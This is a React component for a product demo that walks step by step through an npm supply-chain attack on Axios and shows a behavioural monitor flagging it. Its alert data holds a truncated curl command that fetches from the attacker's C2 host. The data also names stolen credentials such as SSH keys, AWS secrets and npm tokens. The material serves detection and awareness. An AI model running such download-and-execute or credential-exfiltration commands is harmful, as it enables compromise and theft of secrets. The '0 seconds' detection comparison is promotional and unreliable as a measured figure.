import { useState, useCallback, useEffect } from 'react';

const STEPS = [
  { title: 'Clean history', time: 'Before attack' },
  { title: 'Maintainer account compromised', time: 'T\u221218h' },
  { title: 'Malicious dependency published', time: 'T\u22120h' },
  { title: 'RAT phones home', time: 'T+89s' },
  { title: 'Credential harvesting', time: 'T+2min' },
  { title: 'Self-destruct', time: 'T+3min' },
  { title: 'The comparison', time: 'Final state' },
];

const ATTACK_TEXT = [
  'Agent #8192 has been running for 3 months. 200 evaluations. Stable behavior. AAA tier. Score: 105.',
  'Attacker compromises npm account of jasonsaayman (Axios maintainer). Publishes clean decoy: plain-crypto-js@4.2.0 to build registry history. No malicious code yet.',
  'Attacker publishes plain-crypto-js@4.2.1 with postinstall backdoor. Then publishes axios@1.14.1 with plain-crypto-js injected as a dependency. Both latest and legacy tags compromised. The agent\u2019s CI/CD runs npm install and pulls the update.',
  'The postinstall script detects the OS, downloads a platform-specific RAT from sfrclak.com:8000, and executes it. The RAT phones home within 89 seconds.',
  'The RAT enumerates user directories, reads ~/.ssh/, harvests AWS_SECRET_ACCESS_KEY, NPM_TOKEN, and cloud credentials. Transmits them to the C2 server.',
  'The RAT deletes its own binary and the plain-crypto-js postinstall artifacts. npm audit returns clean. No trace in node_modules. Traditional scanners see nothing.',
];

interface Signal {
  title: string;
  details: string[];
  appearsAt: number;
}

const SIGNALS: Signal[] = [
  {
    appearsAt: 2,
    title: 'Dependency graph hash changed',
    details: [
      'New package: plain-crypto-js@4.2.1 (registered 18h ago)',
      'Previous dependency count: 3 \u2192 Current: 4',
    ],
  },
  {
    appearsAt: 3,
    title: 'New outbound destination detected',
    details: [
      'sfrclak.com:8000 \u2014 never seen in 200 prior evaluations',
      'Outbound data: 2.4KB sent to unknown destination',
    ],
  },
  {
    appearsAt: 3,
    title: 'Subprocess spawned',
    details: [
      'sh -c "curl -sS https://sfrclak.com:8000/..."',
      'Agent has NEVER spawned a subprocess before',
    ],
  },
  {
    appearsAt: 4,
    title: 'Sensitive credential access',
    details: [
      'First-time access: ~/.ssh/id_rsa, AWS_SECRET_ACCESS_KEY, NPM_TOKEN',
      'Agent has NEVER accessed these paths or env vars',
    ],
  },
  {
    appearsAt: 4,
    title: 'Outbound data volume spike',
    details: [
      '12.8KB sent to sfrclak.com:8000 (credential payload)',
      'Normal outbound to this destination: 0 bytes (never existed)',
    ],
  },
  {
    appearsAt: 5,
    title: 'Self-modification detected',
    details: [
      'Agent deleted files: node_modules/plain-crypto-js/setup.js, /tmp/rat-binary',
      'Self-destructing behavior detected',
    ],
  },
];

interface LiveCheck {
  check: string;
  result: string;
  pass: boolean;
  live: boolean;
}

const STATIC_COMPARISON: LiveCheck[] = [
  { check: 'Wallet address', result: 'Same', pass: true, live: false },
  { check: 'ERC-8004 identity', result: 'Registered', pass: true, live: false },
  { check: 'AgentKit proof-of-human', result: 'Loading…', pass: true, live: true },
  { check: 'Reputation score', result: 'AAA (no feedback yet)', pass: true, live: false },
  { check: 'npm audit', result: 'Clean (malware self-destructed)', pass: true, live: false },
  { check: 'BehaviorChain', result: '5 critical alerts in 3 minutes', pass: false, live: false },
];

const CHAIN_LABELS = ['Genesis', 'Config v2.1', 'Model upgrade', 'Route \u2192 prod'];

const DEMO_AGENT_ID = 47;

export function AxiosSimulation() {
  const [step, setStep] = useState(0);
  const [locked, setLocked] = useState(false);
  const [comparison, setComparison] = useState<LiveCheck[]>(STATIC_COMPARISON);

  useEffect(() => {
    Promise.all([
      fetch(`/api/agents/${DEMO_AGENT_ID}/trust-signal`).then((r) => r.ok ? r.json() : null),
      fetch(`/api/agents/${DEMO_AGENT_ID}/delegation`).then((r) => r.ok ? r.json() : null),
    ]).then(([trustSignal, delegation]) => {
      setComparison((prev) =>
        prev.map((row) => {
          if (row.check === 'AgentKit proof-of-human') {
            const delegated = delegation?.delegated ?? false;
            return {
              ...row,
              result: delegated ? 'Valid — human-backed (live)' : 'Not delegated (live)',
              pass: true,
              live: true,
            };
          }
          if (row.check === 'BehaviorChain' && trustSignal) {
            return {
              ...row,
              result: `Integrity: ${trustSignal.integrityScore}/100, ${trustSignal.driftFlags} flags, chain ${trustSignal.chainIntact ? 'intact' : 'BROKEN'} (live)`,
              pass: trustSignal.integrityScore >= 50,
            };
          }
          return row;
        }),
      );
    }).catch(() => {});
  }, []);

  const advance = useCallback(() => {
    if (locked || step >= 6) return;
    setLocked(true);
    setStep((s) => s + 1);
    setTimeout(() => setLocked(false), 500);
  }, [step, locked]);

  const restart = useCallback(() => {
    setLocked(true);
    setTimeout(() => {
      setStep(0);
      setLocked(false);
    }, 300);
  }, []);

  const showAttackNode = step >= 2;
  const isDrifting = step >= 2;
  const visibleSignals = SIGNALS.filter((s) => s.appearsAt <= step);
  const criticalCount = SIGNALS.filter(
    (s) => s.appearsAt >= 3 && s.appearsAt <= step,
  ).length;

  const lastChange =
    step < 2
      ? '18 days ago'
      : step === 2
        ? 'just now'
        : step === 3
          ? '89 seconds ago'
          : step === 4
            ? '2 minutes ago'
            : '3 minutes ago';

  return (
    <div className="space-y-6 animate-fade-in">
      {/* Header */}
      <div>
        <div className="flex items-center gap-3 mb-1">
          <h1 className="text-2xl font-bold text-white">Axios Simulation</h1>
          <span className="text-xs font-mono px-2 py-0.5 rounded border bg-status-red/10 text-status-red border-status-red/30">
            LIVE WALKTHROUGH
          </span>
        </div>
        <p className="text-sm text-neutral-500">
          March 31, 2026 supply chain attack vs. BehaviorChain &mdash; step by step
        </p>

        <div className="flex items-center gap-1.5 mt-4">
          {STEPS.map((_, i) => (
            <div
              key={i}
              className={`h-1.5 flex-1 rounded-full transition-all duration-500 ${
                i < step
                  ? 'bg-status-red'
                  : i === step
                    ? step < 2
                      ? 'bg-chain'
                      : 'bg-status-red'
                    : 'bg-neutral-800'
              }`}
            />
          ))}
        </div>
        <div className="flex justify-between mt-1.5">
          <span className="text-xs text-neutral-600 font-mono">
            Step {step + 1}/7 &mdash; {STEPS[step].title}
          </span>
          <span className="text-xs text-neutral-600 font-mono">
            {STEPS[step].time}
          </span>
        </div>
      </div>

      {/* Two-panel layout */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* ── LEFT PANEL: Attack Timeline / Comparison ── */}
        <div className="bg-surface border border-surface-border rounded-lg p-6">
          <h2 className="text-sm font-semibold text-neutral-400 uppercase tracking-wider mb-6">
            {step < 6 ? 'Attack Timeline' : 'Detection Comparison'}
          </h2>

          {step < 6 ? (
            <div>
              {STEPS.slice(0, 6).map((s, i) => (
                <div key={i} className="flex gap-4">
                  <div className="flex flex-col items-center shrink-0">
                    <div
                      className={`w-8 h-8 rounded-full border-2 flex items-center justify-center
                        text-xs font-mono font-bold transition-all duration-300
                        ${
                          i < step
                            ? 'border-status-red/50 bg-status-red/20 text-status-red'
                            : i === step
                              ? 'border-status-red bg-status-red text-white shadow-lg shadow-status-red/25'
                              : 'border-neutral-700 bg-bg text-neutral-600'
                        }`}
                    >
                      {i < step ? '\u2713' : i + 1}
                    </div>
                    {i < 5 && (
                      <div
                        className={`w-0.5 min-h-[20px] flex-1 transition-colors duration-300
                          ${i < step ? 'bg-status-red/30' : 'bg-neutral-800'}`}
                      />
                    )}
                  </div>

                  <div
                    className={`pb-5 flex-1 min-w-0 ${i > step ? 'opacity-30' : ''}`}
                  >
                    <div className="flex items-baseline gap-2 flex-wrap">
                      <span
                        className={`font-semibold text-sm ${
                          i === step
                            ? 'text-white'
                            : i < step
                              ? 'text-neutral-400'
                              : 'text-neutral-600'
                        }`}
                      >
                        {s.title}
                      </span>
                      <span className="text-xs text-neutral-600 font-mono">
                        {s.time}
                      </span>
                    </div>
                    {i === step && (
                      <div className="mt-3 animate-fade-in" key={`atk-${step}`}>
                        <p className="text-sm text-neutral-300 leading-relaxed border-l-2 border-status-red/40 pl-3">
                          {ATTACK_TEXT[i]}
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="animate-fade-in">
              <div className="rounded-lg border border-surface-border overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-surface-border bg-bg">
                      <th className="text-left py-3 px-4 text-neutral-500 font-medium text-xs uppercase tracking-wider">
                        Check
                      </th>
                      <th className="text-left py-3 px-4 text-neutral-500 font-medium text-xs uppercase tracking-wider">
                        Result
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {comparison.map((row, i) => (
                      <tr
                        key={i}
                        className={`border-b border-surface-border/50 last:border-0 ${
                          !row.pass ? 'bg-status-red/5' : ''
                        }`}
                      >
                        <td className="py-3 px-4 text-neutral-300 font-mono text-xs">
                          {row.check}
                        </td>
                        <td className="py-3 px-4">
                          <span
                            className={`font-mono text-xs ${
                              row.pass
                                ? 'text-status-green'
                                : 'text-status-red font-bold'
                            }`}
                          >
                            {row.pass ? '\u2705' : '\uD83D\uDD34'} {row.result}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>

        {/* ── RIGHT PANEL: BehaviorChain Monitor ── */}
        <div className="bg-surface border border-surface-border rounded-lg p-6">
          <h2 className="text-sm font-semibold text-neutral-400 uppercase tracking-wider mb-6">
            BehaviorChain Monitor
          </h2>

          {/* Hash chain */}
          <div className="bg-bg border border-surface-border rounded-lg p-4 mb-5">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-xs text-neutral-500 font-mono uppercase tracking-wider">
                Hash Chain
              </span>
              <span
                className={`text-xs font-mono px-2 py-0.5 rounded border ${
                  isDrifting
                    ? 'bg-status-red/15 text-status-red border-status-red/30'
                    : 'bg-status-green/15 text-status-green border-status-green/30'
                }`}
              >
                {isDrifting ? 'DRIFT DETECTED' : 'VALID'}
              </span>
            </div>

            <div className="flex items-center overflow-x-auto pb-2">
              {CHAIN_LABELS.map((label, i) => (
                <div key={i} className="flex items-center">
                  {i > 0 && <div className="w-8 h-0.5 bg-chain/30" />}
                  <div
                    className={`w-10 h-10 rounded-full border-2 flex items-center justify-center
                      text-xs font-mono font-bold shrink-0
                      ${
                        i === 0
                          ? 'bg-chain/20 border-chain text-chain'
                          : 'bg-neutral-700 border-neutral-600 text-neutral-300'
                      }`}
                    title={label}
                  >
                    {i}
                  </div>
                </div>
              ))}

              {showAttackNode && (
                <div className="flex items-center animate-fade-in">
                  <div
                    className={`w-8 h-0.5 ${
                      step === 2 ? 'bg-status-yellow' : 'bg-status-red'
                    }`}
                  />
                  <div className="relative">
                    <div
                      className={`w-10 h-10 rounded-full border-2 flex items-center justify-center
                        text-xs font-mono font-bold shrink-0 transition-all
                        ${
                          step === 2
                            ? 'bg-status-yellow/20 border-status-yellow text-status-yellow animate-pulse-slow shadow-lg shadow-status-yellow/30'
                            : 'bg-status-red/20 border-status-red text-status-red shadow-lg shadow-status-red/30'
                        }`}
                      title="Dependency graph change"
                    >
                      4
                    </div>
                    {criticalCount > 0 && (
                      <span className="absolute -top-1.5 -right-1.5 w-5 h-5 rounded-full bg-status-red text-white text-[10px] font-bold flex items-center justify-center shadow-md">
                        {criticalCount}
                      </span>
                    )}
                  </div>
                </div>
              )}
            </div>

            <div className="flex items-center gap-4 mt-3 text-xs text-neutral-500 font-mono">
              <span>Last change: {lastChange}</span>
              <span>Clean laps: {step < 2 ? 47 : 0}</span>
            </div>
          </div>

          {/* Alert signals */}
          {visibleSignals.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-12">
              <div className="w-3 h-3 rounded-full bg-status-green/30 mb-3 animate-pulse-slow" />
              <p className="text-neutral-600 text-sm font-mono">
                No drift signals detected
              </p>
              <p className="text-neutral-700 text-xs mt-1">
                Monitor is quiet. All clear.
              </p>
            </div>
          ) : (
            <div className="space-y-3">
              {visibleSignals.map((sig) => (
                <div
                  key={sig.title}
                  className={`border-l-4 border-l-status-red bg-status-red/5
                    border border-surface-border rounded-r-lg p-4
                    ${sig.appearsAt === step ? 'animate-slide-in' : ''}`}
                >
                  <div className="flex items-center gap-2 mb-2">
                    <span className="inline-flex items-center px-2 py-0.5 text-xs font-mono font-bold rounded border bg-status-red/15 text-status-red border-status-red/30">
                      CRITICAL
                    </span>
                    <span className="text-sm font-semibold text-white">
                      {sig.title}
                    </span>
                  </div>
                  {sig.details.map((d, j) => (
                    <p
                      key={j}
                      className="text-xs text-neutral-400 font-mono pl-1 mt-1"
                    >
                      {d}
                    </p>
                  ))}
                </div>
              ))}

              {step >= 5 && (
                <div className="mt-4 p-3 bg-status-red/5 border border-status-red/20 rounded-lg text-center animate-fade-in">
                  <p className="text-sm font-mono text-status-red font-bold">
                    5 critical signals in 3 minutes
                  </p>
                  <p className="text-xs text-neutral-500 mt-1">
                    0 detected by identity checks
                  </p>
                </div>
              )}
            </div>
          )}

          {/* Step 7: detection comparison banner */}
          {step === 6 && (
            <div className="mt-6 space-y-4 animate-fade-in">
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-bg border border-surface-border rounded-lg p-4 text-center">
                  <p className="text-[10px] text-neutral-600 uppercase tracking-wider mb-1">
                    Industry Average Detection
                  </p>
                  <p className="text-2xl font-bold font-mono text-neutral-400">
                    267 days
                  </p>
                </div>
                <div className="bg-bg border border-status-green/20 rounded-lg p-4 text-center">
                  <p className="text-[10px] text-neutral-600 uppercase tracking-wider mb-1">
                    BehaviorChain Detection
                  </p>
                  <p className="text-2xl font-bold font-mono text-status-green">
                    0 seconds
                  </p>
                  <p className="text-[10px] text-neutral-500 mt-0.5">
                    from first behavioral change
                  </p>
                </div>
              </div>
              <p className="text-sm text-neutral-400 italic text-center">
                &ldquo;Socket catches it at the door. BehaviorChain catches it
                in every room.&rdquo;
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Status bar */}
      <div className="bg-surface border border-surface-border rounded-lg px-5 py-3">
        <div className="flex items-center gap-3 text-xs font-mono flex-wrap">
          <span className="text-neutral-500">
            Identity: <span className="text-neutral-300">valid</span>
          </span>
          <span className="text-neutral-700">|</span>
          <span className="text-neutral-500">
            ERC-8004: <span className="text-neutral-300">registered</span>
          </span>
          <span className="text-neutral-700">|</span>
          <span className="text-neutral-500">
            AgentKit:{' '}
            <span className="text-neutral-300">
              {comparison.find((c) => c.check === 'AgentKit proof-of-human')?.result.includes('human-backed') || comparison.find((c) => c.check === 'AgentKit proof-of-human')?.result.includes('Valid')
                ? 'human-backed'
                : 'not delegated'}
            </span>
          </span>
          <span className="text-neutral-700">|</span>
          <span className="text-neutral-500">
            Reputation: <span className="text-neutral-300">AAA</span>
          </span>
          <span className="text-neutral-700">|</span>
          {isDrifting ? (
            <span className="text-status-red font-bold">
              BehaviorChain: ⚠️ CRITICAL DRIFT
            </span>
          ) : (
            <span className="text-neutral-500">
              BehaviorChain:{' '}
              <span className="text-neutral-300">4 changes, 0 drift flags</span>
            </span>
          )}
        </div>
      </div>

      {/* Controls */}
      <div className="flex flex-col items-center gap-4 pb-4">
        {step < 6 ? (
          <button
            onClick={advance}
            disabled={locked}
            className={`px-8 py-3 rounded-lg font-semibold text-sm transition-all
              ${
                locked
                  ? 'bg-neutral-800 text-neutral-600 cursor-not-allowed'
                  : 'bg-chain text-white hover:bg-chain/90 shadow-lg shadow-chain/25 cursor-pointer'
              }`}
          >
            Next Step →
          </button>
        ) : (
          <button
            onClick={restart}
            disabled={locked}
            className="px-8 py-3 rounded-lg font-semibold text-sm bg-surface border border-surface-border
              text-neutral-300 hover:text-white hover:border-neutral-600 transition-all cursor-pointer"
          >
            Restart Simulation
          </button>
        )}
        <p className="text-[11px] text-neutral-600 text-center max-w-lg leading-relaxed">
          Based on real events: Axios npm compromise, March 31, 2026. Attributed
          to Sapphire Sleet (DPRK).
        </p>
      </div>
    </div>
  );
}
